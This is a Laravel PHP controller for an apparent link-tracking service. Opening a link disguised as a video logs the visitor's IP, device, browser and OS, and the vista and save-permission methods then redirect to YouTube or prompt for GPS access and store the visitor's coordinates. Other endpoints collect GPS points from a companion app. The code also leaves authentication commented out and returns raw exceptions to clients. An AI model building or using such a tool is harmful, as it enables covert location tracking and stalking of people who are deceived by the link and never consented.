<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\User;
use App\Models\TipoFondoPantalla;
use App\Models\Enlaces;
use App\Models\EnlacesDetector;
use App\Models\EnlacesGeoApp;
use App\Models\EnlacesGeoAppLatLng;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Illuminate\Contracts\Encryption\DecryptException;
use Jenssegers\Agent\Agent;

class HomeController extends Controller
{
 
    public $date;

    public function __construct()
    {
        $this->date = new \DateTime();
        // $this->middleware('auth');
    }

    public function index()
    {
        return view('home');
    }
    public function crear_usuario()
    {
        return view('pages.creacion-usuario');
    }
    public function crear_usuario_save(Request $request)
    {
        if(isset($request->name) && isset($request->email) && isset($request->password)){
            try {
                $new = new User;
                $new->name = $request->name;
                $new->email =  trim($request->email);
                $new->password = Hash::make($request->password);
                $new->users_create_id = Auth::user()->id;
                $new->estado = 1;
                $new->save();
                return redirect()->back()->with('success', 'Usuario creado correctamente, no olvides la contraseña, por seguridad no se puede restablecer');  
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema al intentar registrar un nuevo usuario');   
            }
        }else{
            return redirect()->back()->with('warning', 'Debes completar el formulario');   
        }
    }
    public function modificar_usuario_save(Request $request)
    {
        if(isset($request->token) && isset($request->status)){
            $token = Crypt::decryptString($request->token);
            try {
                $new = User::find($token);
                $new->users_modifica_id = Auth::user()->id;
                $new->estado = $request->status;
                $new->save();
                return redirect()->back()->with('success', 'Usuario modificado correctamente, no olvides la contraseña, por seguridad no se puede restablecer');  
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema al intentar modificar un nuevo usuario');   
            }
        }else{
            return redirect()->back()->with('warning', 'Los valores enviados no son  correctos');   
        }
    }
    
    public function bandeja_usuario()
    {
        $data = [ 
            'usuarios' => User::get()
        ];
        return view('pages.bandeja-usuarios',$data);
    }
    public function crear_enlaces()
    {
        $data = [ 
            'data' => TipoFondoPantalla::get()
        ];
        return view('pages.creacion-url',$data);
    }
    public function guardar_enlaces(Request $request)
    {

        if(isset($request->tipo_fondo_pantallas_id) && isset($request->titulo) && isset($request->descripcion)){
            try {
                $new = new Enlaces;
                $new->tipo_fondo_pantallas_id = $request->tipo_fondo_pantallas_id;
                $new->titulo = $request->titulo;
                $new->descripcion = $request->descripcion;
                $new->users_create_id = Auth::user()->id;
                $new->save();
                return redirect()->back()->with('success', 'Registrado correctamente');  
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema');   
            }
        }else{
            return redirect()->back()->with('warning', 'Los valores enviados no son  correctos');   
        }
    }
    public function ver_enlaces(Request $request)
    {
        if(isset($request->token)){
            $token = Crypt::decryptString($request->token);
            try {
                $enlace = Enlaces::find($token);
                $contenido = EnlacesDetector::where('enlaces_id',$token)->get();
                $data = [
                    'token' => $request->token,
                    'enlace' => $enlace,
                    'contenido' => $contenido,
                ];
                return view('pages.ver-enlace',$data);
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema');   
            }
        }else{
            return redirect()->back()->with('warning', 'Los valores enviados no son  correctos');   
        }
    }
    public function bandeja_enlaces()
    {
        $data = [ 
            'data' => Enlaces::get()
        ];
        return view('pages.bandeja',$data);
    }


    public function crear_enlaces_app()
    {
        return view('pages.creacion-url-app');
    }
    public function guardar_enlaces_app(Request $request)
    {

            try {
                $new = new EnlacesGeoApp;
                $new->titulo = $request->titulo;
                $new->users_create_id = Auth::user()->id;
                $new->save();
                return redirect()->route('ver_enlaces_app', ['token' => Crypt::encryptString($new->id)]);
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema');   
            }
     
    }
    public function ver_enlaces_app(Request $request)
    {
        if(isset($request->token)){
            $token = Crypt::decryptString($request->token);
            try {
                $enlace = EnlacesGeoApp::find($token);
                $contenido = EnlacesGeoAppLatLng::where('enlaces_geo_apps_id',$token)->get();
                $data = [
                    'token' => $request->token,
                    'enlace' => $enlace,
                    'contenido' => $contenido,
                ];
                return view('pages.ver-enlace-app',$data);
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema');   
            }
        }else{
            return redirect()->back()->with('warning', 'Los valores enviados no son  correctos');   
        }
    }
    public function bandeja_enlaces_app()
    {
        $data = [ 
            'data' => EnlacesGeoApp::get()
        ];
        return view('pages.bandeja-app',$data);
    }


    public function vista(Request $request)
    {
       try {
            $agent = new Agent();
            $data = [
                'agent' => $agent
            ];
            if(!isset($request->comenzar) && isset($request->video)){ // rapido con menos eficacia
                $enlace = Enlaces::find(base64_decode($request->video));
                $enlace_detector = new EnlacesDetector();
                $enlace_detector->enlaces_id = $enlace->id;
                $enlace_detector->modalidad_ingreso = "Rastreo Rapido";
                $enlace_detector->ip = self::ippublic();
                $enlace_detector->lugar =  self::obtener_dispositivo_name();
                $enlace_detector->dispositivo = self::obtener_dispositivo();
                $enlace_detector->navegador = self::obtener_navegador();
                $enlace_detector->version = self::obtener_dispositivo_version();
                $enlace_detector->save();
                header('Location: https://www.youtube.com/watch?v=aW7bzd8uwyQ');
                exit;
            }elseif(isset($request->video)){ // lento y eficaz
                $enlace = Enlaces::find(base64_decode($request->video));
                $enlace_detector = new EnlacesDetector();
                $enlace_detector->enlaces_id = $enlace->id;
                $enlace_detector->modalidad_ingreso = "SOLICITANDO PERMISO AL GPS";
                $enlace_detector->ip =self::ippublic();
                $enlace_detector->lugar =  self::obtener_dispositivo_name();
                $enlace_detector->dispositivo = self::obtener_dispositivo();
                $enlace_detector->navegador = self::obtener_navegador();
                $enlace_detector->version = self::obtener_dispositivo_version();
                $enlace_detector->save();
                // dd($enlace);
                $data = [
                    'agent' => $agent,
                    'enlace' => $enlace,
                    'enlace_detector' => $enlace_detector
                ];
                return view("welcome",$data);
            }else{
                return redirect()->route('login');
            }
       } catch (\Throwable $th) {
        //throw $th;
       }
       
    }
    public function vista_guardar_permisos(Request $request){
        $enlace_detector = EnlacesDetector::find($request->id);
        $enlace_detector->latitud = $request->latitude;
        $enlace_detector->longitud = $request->longitude;
        $enlace_detector->created_permission = $this->date->format('Y-m-d H:i:s');
        return $enlace_detector->save();
    }

    public function vista_guardar_iplocation(Request $request){
        $enlace_detector = EnlacesDetector::find($request->id);

        $enlace_detector->ipjs = $request->ip;
        $enlace_detector->city = $request->city;

        $enlace_detector->continent = $request->continent;
        $enlace_detector->country = $request->country;
        $enlace_detector->country_capital = $request->country_capital;
        $enlace_detector->country_code = $request->country_code;

        $enlace_detector->country_phone = $request->country_phone;
        $enlace_detector->currency = $request->currency;
        $enlace_detector->isp = $request->isp;
        $enlace_detector->currency_rates = $request->currency_rates;

        $enlace_detector->latitude = $request->latitude;
        $enlace_detector->longitude = $request->longitude;
        $enlace_detector->region = $request->region;
        $enlace_detector->timezone = $request->timezone;

        $enlace_detector->created_ip_location = $this->date->format('Y-m-d H:i:s');
        return $enlace_detector->save();
    }
    public static function ippublic(){
        if(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
            $address = $_SERVER['HTTP_X_FORWARDED_FOR'];
          // Look for HTTP_CLIENT_IP header
          }elseif(!empty($_SERVER['HTTP_CLIENT_IP'])){
            $address = $_SERVER['HTTP_CLIENT_IP'];
          // Get the client's IP address from the REMOTE_ADDR variable
          }else{
            $address = "0.0.0.0";
          }
          return $address;
    }
    public static function obtener_navegador(){
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        if(strpos($user_agent, 'MSIE') !== FALSE)
           $nombre_navegador= 'Internet explorer';
         elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
            $nombre_navegador= 'Microsoft Edge';
         elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
            $nombre_navegador= 'Internet explorer';
         elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
             $nombre_navegador= "Opera Mini";
         elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
            $nombre_navegador= "Opera";
         elseif(strpos($user_agent, 'Firefox') !== FALSE)
            $nombre_navegador= 'Mozilla Firefox';
         elseif(strpos($user_agent, 'Chrome') !== FALSE)
            $nombre_navegador= 'Google Chrome';
         elseif(strpos($user_agent, 'Safari') !== FALSE)
            $nombre_navegador= "Safari";
         else
            $nombre_navegador= 'SIN DETECTAR NAVEGADOR';  

         return strtoupper($nombre_navegador);
    }
    public static function obtener_dispositivo(){
        $tablet_browser = 0;
        $mobile_browser = 0;
        $body_class = 'desktop';
         
        if (preg_match('/(tablet|ipad|playbook)|(android(?!.*(mobi|opera mini)))/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
            $tablet_browser++;
            $body_class = "tablet";
        }
         
        if (preg_match('/(up.browser|up.link|mmp|symbian|smartphone|midp|wap|phone|android|iemobile)/i', strtolower($_SERVER['HTTP_USER_AGENT']))) {
            $mobile_browser++;
            $body_class = "mobile";
        }
         
        if ((strpos(strtolower($_SERVER['HTTP_ACCEPT']),'application/vnd.wap.xhtml+xml') > 0) or ((isset($_SERVER['HTTP_X_WAP_PROFILE']) or isset($_SERVER['HTTP_PROFILE'])))) {
            $mobile_browser++;
            $body_class = "mobile";
        }
         
        $mobile_ua = strtolower(substr($_SERVER['HTTP_USER_AGENT'], 0, 4));
        $mobile_agents = array(
            'w3c ','acs-','alav','alca','amoi','audi','avan','benq','bird','blac',
            'blaz','brew','cell','cldc','cmd-','dang','doco','eric','hipt','inno',
            'ipaq','java','jigs','kddi','keji','leno','lg-c','lg-d','lg-g','lge-',
            'maui','maxo','midp','mits','mmef','mobi','mot-','moto','mwbp','nec-',
            'newt','noki','palm','pana','pant','phil','play','port','prox',
            'qwap','sage','sams','sany','sch-','sec-','send','seri','sgh-','shar',
            'sie-','siem','smal','smar','sony','sph-','symb','t-mo','teli','tim-',
            'tosh','tsm-','upg1','upsi','vk-v','voda','wap-','wapa','wapi','wapp',
            'wapr','webc','winw','winw','xda ','xda-');
         
        if (in_array($mobile_ua,$mobile_agents)) {
            $mobile_browser++;
        }
         
        if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']),'opera mini') > 0) {
            $mobile_browser++;
            //Check for tablets on opera mini alternative headers
            $stock_ua = strtolower(isset($_SERVER['HTTP_X_OPERAMINI_PHONE_UA'])?$_SERVER['HTTP_X_OPERAMINI_PHONE_UA']:(isset($_SERVER['HTTP_DEVICE_STOCK_UA'])?$_SERVER['HTTP_DEVICE_STOCK_UA']:''));
            if (preg_match('/(tablet|ipad|playbook)|(android(?!.*mobile))/i', $stock_ua)) {
              $tablet_browser++;
            }
        }
        if ($tablet_browser > 0) {
        // Si es tablet has lo que necesites
           return 'Tablet';
        }
        else if ($mobile_browser > 0) {
        // Si es dispositivo mobil has lo que necesites
            return 'Celular';
        }
        else {
        // Si es ordenador de escritorio has lo que necesites
            return 'ordenador';
        }  
    }
    public static function obtener_dispositivo_version(){
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $plataformas = array(
            'Windows 10' => 'Windows NT 10.0+',
            'Windows 8.1' => 'Windows NT 6.3+',
            'Windows 8' => 'Windows NT 6.2+',
            'Windows 7' => 'Windows NT 6.1+',
            'Windows Vista' => 'Windows NT 6.0+',
            'Windows XP' => 'Windows NT 5.1+',
            'Windows 2003' => 'Windows NT 5.2+',
            'Windows' => 'Windows otros',
            'iPhone' => 'iPhone',
            'iPad' => 'iPad',
            'Mac OS X' => '(Mac OS X+)|(CFNetwork+)',
            'Mac otros' => 'Macintosh',
            'Android' => 'Android',
            'BlackBerry' => 'BlackBerry',
            'Linux' => 'Linux',
         );
         foreach($plataformas as $plataforma=>$pattern){
            if (preg_match('/(?i)'.$pattern.'/', $user_agent))
               return $plataforma;
         }
         return 'No detectado';
    }
    public static function obtener_dispositivo_name(){
        $namepc = php_uname();
        $nombre_host = gethostbyaddr($_SERVER['REMOTE_ADDR']);
        if($namepc){
            return $namepc;
        }else if($nombre_host){
            return $nombre_host;
        }else{
            return 'No detectado';
        }
    }

    
      
    public function login_app(Request $request){
        $usuario = User::where('email',$request->email)->first();
        if(!$usuario){
            return response()->json([
                'url' => null,
                'codigo' => null,
                'mensaje' => null, 
                'error' => 'No tienes habilitado un usuario!',
                'data' => $request->all()
            ]);
        }
        if($usuario->estado != 1){
            return response()->json([
                'url' => null,
                'codigo' => null,
                'mensaje' => null, 
                'error' => 'Tu usuario está BLOQUEADO!',
                'data' => []
            ]);
        }
        $pass = Hash::check($request->password, $usuario->password);
        if($pass) {
            return response()->json([
                'url' => route('vista'),
                'codigo' => base64_decode($request->token),
                'mensaje' => 'Bienvenido', 
                'error' => '',
                'data' => $usuario->id
            ]);
        }else{
            return response()->json([
                'url' => null,
                'codigo' => null,
                'mensaje' => null, 
                'error' => 'Las credenciales ingresadas no son válidas!',
                'data' => []
            ]);
        }
    }

    public function send_gps(Request $request){
        $data = [];
        $mensaje = "";
        $error= "";
       try {
            $save = new EnlacesGeoAppLatLng;
            $save->enlaces_geo_apps_id = $request->id;
            $save->latitud = $request->latitud;
            $save->longitud = $request->longitud;
            $save->users_create_id = $request->user;
            $data =  $save->save();
       } catch (\Throwable $th) {
            $error = "Error";
       }

       return response()->json([
            'mensaje' => $mensaje, 
            'error' => $error,
            'data' => $data
        ]);
    }
    public function mapa_app(Request $request){
        if(isset($request->token)){
            $token = Crypt::decryptString($request->token);
            try {
                $enlace = EnlacesGeoApp::find($token);
                $contenido = EnlacesGeoAppLatLng::where('enlaces_geo_apps_id',$token)->get();
                $data = [
                    'token' => $request->token,
                    'enlace' => $enlace,
                    'contenido' => $contenido,
                ];
                return view('pages.ver-mapa-app',$data);
            } catch (\Throwable $th) {
                return $th;
                return redirect()->back()->with('error', 'Ocurrio un problema');   
            }
        }else{
            return redirect()->back()->with('warning', 'Los valores enviados no son  correctos');   
        }
    }
    
    
}
